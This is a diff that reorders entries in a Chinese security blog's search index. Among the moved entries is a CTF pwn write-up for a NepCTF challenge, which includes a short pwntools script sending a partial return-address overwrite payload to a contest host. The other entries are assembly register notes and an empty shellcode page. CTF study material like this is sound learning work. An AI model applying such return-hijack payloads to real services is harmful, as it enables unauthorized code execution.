@@ -201,30 +201,6 @@
       </categories>
   </entry>
   <entry>
-    <title>EIP</title>
-    <url>/article/EIP/</url>
-    <content><![CDATA[<h1 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h1><span id="more"></span>
-<h2 id="地址随机化"><a href="#地址随机化" class="headerlink" title="地址随机化"></a>地址随机化</h2><h3 id="NepCTF-给你一朵小红花"><a href="#NepCTF-给你一朵小红花" class="headerlink" title="NepCTF 给你一朵小红花"></a>NepCTF 给你一朵小红花</h3><p>2021.3.25</p>
-<p>找字符串看见cat flag的system函数，进去发现反编译是红色的，快捷键P手动让IDA生成一个函数</p>
-<p><img src="/article/EIP/20210325191702.png" alt="20210325191702"></p>
-<p><img src="/article/EIP/20210325191953.png" alt="20210325191953"></p>
-<p>只要程序返回到这个</p>
-<p><img src="/article/EIP/%7B9A808D7E-F8DA-C99D-776D-F86EB6839E53%7D.JPG" alt="{9A808D7E-F8DA-C99D-776D-F86EB6839E53}"></p>
-<p>也就是返回了序号5对应的字符<br>这个时候发送send不要line 下面的内容</p>
-<p><img src="/article/EIP/20210325192243.png" alt="20210325192243"></p>
-<p><code>p64(0) + p64(1) + b&quot;\xE1&quot;</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line"><span class="comment">#p = process(&#x27;./xhh&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">35402</span> )</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)  </span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + <span class="string">b&quot;\xE1&quot;</span> </span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
-
-<p>多跑几次就能出flag</p>
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>EIP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Heap_Learn</title>
     <url>/article/Heap_Learn/</url>
     <content><![CDATA[<h1 id="Heap-Learn"><a href="#Heap-Learn" class="headerlink" title="Heap_Learn"></a>Heap_Learn</h1><span id="more"></span>
@@ -267,6 +243,30 @@
       </categories>
       <tags>
         <tag>Heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>EIP</title>
+    <url>/article/EIP/</url>
+    <content><![CDATA[<h1 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h1><span id="more"></span>
+<h2 id="地址随机化"><a href="#地址随机化" class="headerlink" title="地址随机化"></a>地址随机化</h2><h3 id="NepCTF-给你一朵小红花"><a href="#NepCTF-给你一朵小红花" class="headerlink" title="NepCTF 给你一朵小红花"></a>NepCTF 给你一朵小红花</h3><p>2021.3.25</p>
+<p>找字符串看见cat flag的system函数，进去发现反编译是红色的，快捷键P手动让IDA生成一个函数</p>
+<p><img src="/article/EIP/20210325191702.png" alt="20210325191702"></p>
+<p><img src="/article/EIP/20210325191953.png" alt="20210325191953"></p>
+<p>只要程序返回到这个</p>
+<p><img src="/article/EIP/%7B9A808D7E-F8DA-C99D-776D-F86EB6839E53%7D.JPG" alt="{9A808D7E-F8DA-C99D-776D-F86EB6839E53}"></p>
+<p>也就是返回了序号5对应的字符<br>这个时候发送send不要line 下面的内容</p>
+<p><img src="/article/EIP/20210325192243.png" alt="20210325192243"></p>
+<p><code>p64(0) + p64(1) + b&quot;\xE1&quot;</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line"><span class="comment">#p = process(&#x27;./xhh&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">35402</span> )</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)  </span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + <span class="string">b&quot;\xE1&quot;</span> </span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>多跑几次就能出flag</p>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>EIP</tag>
       </tags>
   </entry>
   <entry>
@@ -1153,14 +1153,6 @@
       </categories>
   </entry>
   <entry>
-    <title>shellcode</title>
-    <url>/article/shellcode/</url>
-    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
-      <categories>
-        <category>WriteUp/笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>_stack_chk_fail</title>
     <url>/article/stack_chk_fail/</url>
     <content><![CDATA[<h1 id="stack-chk-fail"><a href="#stack-chk-fail" class="headerlink" title="stack_chk_fail"></a>stack_chk_fail</h1><span id="more"></span>
@@ -1259,6 +1251,14 @@
       </tags>
   </entry>
   <entry>
+    <title>shellcode</title>
+    <url>/article/shellcode/</url>
+    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>整形溢出</title>
     <url>/article/Shaping%20overflow/</url>
     <content><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span>
@@ -1291,46 +1291,6 @@
       <tags>
         <tag>整形溢出</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>汇编</title>
-    <url>/article/assembly/</url>
-    <content><![CDATA[<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><span id="more"></span>
-
-
-
-<p><img src="/article/assembly/image-20210711150318837.png" alt="image-20210711150318837"></p>
-<ul>
-<li><p>RIP(PC)</p>
-<p>存放下一条指令的偏移地址</p>
-</li>
-<li><p>RSP</p>
-<p>存放当前栈帧的栈顶偏移地址</p>
-<p>低地址的一端</p>
-</li>
-<li><p>RBP</p>
-<p>存放当前栈帧的栈底偏移地址</p>
-<p>高地址的一端</p>
-<p>与返回地址（return address）相邻</p>
-</li>
-<li><p>RAX</p>
-<p>存放函数返回值</p>
-</li>
-<li><p>RCX</p>
-<p>存放累加器的结果</p>
-</li>
-<li><p>RDI</p>
-<p>存放第一个参数</p>
-</li>
-<li><p>RSI</p>
-<p>存放第二个参数</p>
-</li>
-</ul>
-<p>64位程序中函数的前6个参数使用寄存器进行存储：rdi、rsi、rdx、rcx、r8、r9</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
   </entry>
   <entry>
     <title>栈迁移</title>
@@ -1390,6 +1350,46 @@
       <tags>
         <tag>栈迁移</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>汇编</title>
+    <url>/article/assembly/</url>
+    <content><![CDATA[<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><span id="more"></span>
+
+
+
+<p><img src="/article/assembly/image-20210711150318837.png" alt="image-20210711150318837"></p>
+<ul>
+<li><p>RIP(PC)</p>
+<p>存放下一条指令的偏移地址</p>
+</li>
+<li><p>RSP</p>
+<p>存放当前栈帧的栈顶偏移地址</p>
+<p>低地址的一端</p>
+</li>
+<li><p>RBP</p>
+<p>存放当前栈帧的栈底偏移地址</p>
+<p>高地址的一端</p>
+<p>与返回地址（return address）相邻</p>
+</li>
+<li><p>RAX</p>
+<p>存放函数返回值</p>
+</li>
+<li><p>RCX</p>
+<p>存放累加器的结果</p>
+</li>
+<li><p>RDI</p>
+<p>存放第一个参数</p>
+</li>
+<li><p>RSI</p>
+<p>存放第二个参数</p>
+</li>
+</ul>
+<p>64位程序中函数的前6个参数使用寄存器进行存储：rdi、rsi、rdx、rcx、r8、r9</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
   </entry>
   <entry>
     <title>湖湘杯hxb_Pwn</title>
